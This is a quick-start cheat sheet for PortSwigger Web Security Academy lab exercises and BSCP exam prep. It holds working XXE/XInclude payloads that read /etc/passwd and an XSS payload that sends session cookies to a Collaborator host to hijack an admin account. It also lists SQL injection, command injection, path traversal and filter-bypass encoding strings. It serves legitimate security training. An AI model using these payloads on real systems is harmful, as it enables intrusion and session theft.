# Essential Skills - Quick Start Guide

**Speed-run reference for PortSwigger Web Security Academy Essential Skills**

---

## Emergency Cheat Commands

### Lab 1: Targeted Scanning (10-minute time limit)

**Objective:** Retrieve `/etc/passwd` within 10 minutes

**60-Second Strategy:**
1. Navigate to product → Click "Check stock"
2. Burp Proxy History → Find `POST /product/stock` (XML request)
3. Right-click → "Do active scan" or "Scan"
4. Wait 2 minutes for XXE finding
5. Send to Repeater, test XInclude payload

**XInclude Payload (if DOCTYPE blocked):**
```xml
POST /product/stock HTTP/2
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>1<foo xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///etc/passwd"/></foo></productId>
    <storeId>1</storeId>
</stockCheck>
```

**Classic XXE Payload:**
```xml
POST /product/stock HTTP/2
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

**Time Breakdown:**
- 0-2 min: Find XML endpoint
- 2-4 min: Run targeted scan
- 4-8 min: Manual XXE testing
- 8-10 min: Verify success

---

### Lab 2: Non-Standard Data Structures

**Objective:** Delete user "carlos"

**5-Minute Strategy:**
1. Login: `wiener:peter`
2. Observe cookie: `session=wiener:AbCdEfGhIjKlMnOp`
3. Burp Repeater → Highlight "wiener" → Right-click → "Scan selected insertion point"
4. Scanner finds stored XSS
5. Replace cookie username with XSS payload
6. Wait for Burp Collaborator callback with admin cookie
7. Use admin cookie to access `/admin/delete?username=carlos`

**XSS Cookie Payload:**
```http
Cookie: session=<script>document.location='https://YOUR-COLLABORATOR.oastify.com/?c='%2bdocument.cookie;</script>:TOKEN
```

**Get Collaborator URL:**
- Burp menu → Burp Collaborator client → Copy to clipboard

**Delete Carlos:**
```http
GET /admin/delete?username=carlos HTTP/2
Cookie: session=administrator:STOLEN_TOKEN
```

**Time Breakdown:**
- 0-3 min: Login, identify cookie format
- 3-6 min: Scan username insertion point
- 6-8 min: Craft and inject XSS payload
- 8-10 min: Wait for admin callback
- 10-12 min: Use stolen session, delete carlos

---

## Essential Techniques

### Targeted Scanning

**When to Use:** Time constraints, specific suspicious endpoint

**How:**
1. Find request in Proxy History
2. Right-click → "Do active scan"
3. Select "All except time-based detection" (fastest)
4. Review findings in real-time (don't wait for completion)

**Key Benefit:** 10x faster than full-site scan

---

### Scan Selected Insertion Point

**When to Use:** Non-standard data structures (colon-separated, pipe-delimited, JSON-in-cookie)

**How:**
1. Send request to Repeater
2. Highlight ONLY the portion to test (e.g., username in `user:token`)
3. Right-click highlighted text → "Scan selected insertion point"
4. Review findings

**Example Data Structures:**
- `session=username:token` (test username separately)
- `data=id|role|prefs` (test each pipe-separated value)
- `auth={"user":"admin","role":"guest"}` (test JSON keys)

---

## Encoding Bypass Cheat Sheet

### URL Encoding
```
< = %3C
> = %3E
' = %27
" = %22
/ = %2F
```

**Double Encoding:**
```
/ = %2F = %252F
```

### HTML Entities
```
< = &lt; = &#60; = &#x3C;
> = &gt; = &#62; = &#x3E;
' = &#39; = &#x27;
```

### XML Entities (for SQL keyword bypass)
```
UNION = &#85;NION
SELECT = &#83;ELECT
```

**Lab Example:**
```xml
<storeId>1 &#85;NION &#83;ELECT username FROM users--</storeId>
```

### SQL CHAR() Function
```sql
-- Instead of 'admin'
CHAR(97,100,109,105,110)

-- Instead of ' OR '1'='1
CHAR(39) OR CHAR(39,49,39,61,39,49)
```

### JavaScript Unicode
```javascript
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
// alert(1) in Unicode
```

---

## Mystery Lab Strategy

**Reconnaissance (15 min):**
1. Browse all features
2. Test account: `wiener:peter`
3. Identify input points (forms, parameters, file uploads)

**Hypothesis (5 min):**
- Authentication feature → Brute force, 2FA bypass
- Search → SQLi, XSS
- File upload → RCE, path traversal
- Comments → Stored XSS, CSRF
- Admin panel → Access control

**Testing Checklist (30 min):**
- [ ] SQL Injection: `' OR '1'='1'--`, `1' UNION SELECT NULL--`
- [ ] XSS: `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`
- [ ] Access Control: Try accessing `/admin`, manipulate IDs
- [ ] Path Traversal: `../../../../etc/passwd`
- [ ] Command Injection: `; whoami`, `| whoami`
- [ ] XXE: Test XML endpoints with entity payloads
- [ ] CSRF: Check for anti-CSRF tokens

**Exploitation (15 min):**
- Once identified, craft specific exploit
- Complete lab objective

---

## Burp Suite Quick Commands

### Scanner Configuration
```
Scanner → Scan configuration → New scan configuration
Audit checks → All except time-based detection ✓
```

### Collaborator
```
Burp menu → Burp Collaborator client → Copy to clipboard
Use in payloads: YOUR-ID.oastify.com
Poll for results: Click "Poll now"
```

### Repeater Shortcuts
```
Ctrl+R / Cmd+R = Send to Repeater
Ctrl+I / Cmd+I = Send to Intruder
Ctrl+Space = Send request
```

### Decoder
```
Burp menu → Decoder
Paste text → Select encoding from dropdown
URL, HTML, Base64, Hex, etc.
```

---

## Time Targets

| Lab/Challenge | Beginner | Expert |
|---------------|----------|--------|
| Lab 1 (Targeted Scanning) | 15 min | 5 min |
| Lab 2 (Non-Standard Data) | 25 min | 10 min |
| Mystery Lab (Practitioner) | 90 min | 30 min |

---

## Common Mistakes

❌ Running full-site scans (wastes time)
❌ Ignoring scanner findings (missing hints)
❌ Not encoding payloads properly (bypasses fail)
❌ Waiting for scan completion (review in real-time)
❌ Testing everything manually (use scanner for thoroughness)

✅ Targeted scans on suspicious endpoints
✅ Review scanner findings as they appear
✅ Combine scanner + manual testing
✅ Use encoding for filter bypass
✅ Scan selected insertion points for custom structures

---

## Real-World Application

**Before Essential Skills:**
- Full scan → 2 hours
- 500 findings → 3 hours review
- 2 real vulnerabilities found
- Total: 5+ hours

**After Essential Skills:**
- Recon → 30 min
- Targeted scans → 1 hour
- Manual verification → 1 hour
- 5-10 real vulnerabilities found
- Total: 2.5 hours (2x faster, 3x more findings)

---

## Certification Prep (BSCP)

**Requirements:**
- Complete all Apprentice labs ✓
- Complete all Practitioner labs ✓
- Complete 5 Practitioner Mystery Labs ✓
- Master Essential Skills techniques ✓

**Practice Routine:**
1. One Mystery Lab per week
2. Time yourself (target: under 60 min)
3. No hints or solutions
4. Document findings

---

## One-Liner Cheat Sheet

**Lab 1:** Find XML → Scan → XInclude: `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`

**Lab 2:** Login → Cookie `user:token` → Scan username → XSS: `<script>location='https://COLLAB/?c='+document.cookie</script>` → Steal admin → Delete carlos

**Mystery Lab:** Recon → Hypothesize → Test (SQLi, XSS, Access Control) → Exploit

**Encoding Bypass:** Try single encoding → double encoding → XML/HTML entities → Unicode → CHAR()

**Scanner:** Targeted scan (specific request) > Scan selected insertion point (custom location) > Full scan (avoid)

---

## Quick Reference URLs

- **Essential Skills:** https://portswigger.net/web-security/essential-skills
- **Lab 1:** https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing/lab-discovering-vulnerabilities-quickly-with-targeted-scanning
- **Lab 2:** https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing/lab-scanning-non-standard-data-structures
- **Mystery Labs:** https://portswigger.net/web-security/mystery-lab-challenge
- **All Labs:** https://portswigger.net/web-security/all-labs

---

**Print this page and keep it handy during labs for instant reference!**
